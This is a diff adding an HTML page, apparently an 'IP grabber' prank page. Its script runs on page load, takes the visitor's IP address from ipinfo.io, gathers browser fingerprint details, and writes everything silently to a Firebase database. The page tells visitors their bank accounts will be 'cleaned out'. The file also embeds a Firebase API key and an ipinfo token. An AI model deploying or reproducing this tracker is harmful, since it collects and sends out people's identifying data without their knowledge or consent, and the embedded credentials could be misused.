@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script type="module">
+      // Import the Firebase modules
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js";
+      import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-database.js";
+
+      const firebaseConfig = {
+        apiKey: "AIzaSyA3M7VhSpN4YaRIz5IYZuwVQTqc3fs2u3E",
+        authDomain: "ipgrab-befbf.firebaseapp.com",
+        projectId: "ipgrab-befbf",
+        storageBucket: "ipgrab-befbf.firebasestorage.app",
+        messagingSenderId: "889495806315",
+        appId: "1:889495806315:web:59f8cb98470ce83257ec2e"
+      };
+
+      // Initialize Firebase and the Realtime Database
+      const app = initializeApp(firebaseConfig);
+      const db = getDatabase(app);
+
+      (function gatherVisitorInfo() {
+        const visitorInfo = {};
+
+        // Fetch IP information from ipinfo.io
+        fetch('https://ipinfo.io/json?token=c426e26ebceceb')
+          .then(response => response.json())
+          .then(data => {
+            visitorInfo.ip = data.ip;
+            updateInfoDisplay(visitorInfo);
+            logVisitorInfo(visitorInfo);
+          })
+          .catch(error => {
+            document.getElementById('ip-display').innerText = 'Error fetching the IP address';
+            console.error('Error:', error);
+          });
+
+        // Collect additional visitor information
+        visitorInfo.userAgent = navigator.userAgent;
+        visitorInfo.language = navigator.language;
+        visitorInfo.platform = navigator.platform;
+        visitorInfo.screenResolution = `${window.screen.width}x${window.screen.height}`;
+        visitorInfo.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        visitorInfo.localTime = new Date().toLocaleString();
+
+        if (navigator.connection) {
+          visitorInfo.networkType = navigator.connection.effectiveType;
+          visitorInfo.downlink = navigator.connection.downlink;
+          visitorInfo.rtt = navigator.connection.rtt;
+        }
+
+        visitorInfo.referrer = document.referrer;
+
+        // Display all information on the page
+        function updateInfoDisplay(info) {
+          const container = document.getElementById('info-list');
+          container.innerHTML = '';
+          for (const [key, value] of Object.entries(info)) {
+            const infoItem = document.createElement('p');
+            infoItem.className = 'info-item';
+            infoItem.innerText = `${key}: ${value}`;
+            container.appendChild(infoItem);
+          }
+        }
+
+        // Log visitor info to Firebase Realtime Database using IP as key
+        function logVisitorInfo(info) {
+          const infoRef = ref(db, 'visitor-info/' + info.ip.replaceAll('.', ' '));
+          set(infoRef, info)
+            .then(() => {
+              console.log("Visitor information logged successfully.");
+            })
+            .catch((error) => {
+              console.error("Error logging visitor information:", error);
+            });
+        }
+
+        updateInfoDisplay(visitorInfo);
+      })();
+    </script>
+  </head>
+
+  <body>
+    <h1>Thank you!</h1>
+    <div id="info-container" class="info-container">
+      <p id="ip-display">Thank you for your personal information! Expect your bank accounts to be cleaned out within the hour.</p>
+      <p id="info-list"></p>
+    </div>
+  </body>
+</html>
